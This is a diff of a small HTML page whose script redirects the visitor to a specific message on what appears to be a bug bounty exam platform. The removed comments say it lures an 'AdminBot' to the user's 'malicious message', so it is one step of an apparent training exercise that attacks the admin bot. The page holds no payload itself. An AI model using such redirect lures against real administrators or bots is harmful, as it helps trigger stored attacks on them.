@@ -1,18 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Loading...</title>
-</head>
 <body>
     <script>
-        // REPLACE '12345' with the actual ID of the message you sent
-        const messageId = '69eaa41cbee6d6b7c66466e4'; 
-        const targetUrl = 'https://bugbounty-exam.hashacademy.co/dashboard/messages/' + messageId;
-
-        console.log("Redirecting Admin to the trap...");
-        
-        // This forces the AdminBot to navigate to your malicious message
-        window.location.href = targetUrl;
+        // REPLACE '12345' with the Message ID from your "Sent" folder
+        const msgId = '69eaa567bee6d6b7c6646710'; 
+        window.location.replace('https://bugbounty-exam.hashacademy.co/dashboard/messages/' + msgId);
     </script>
 </body>
 </html>
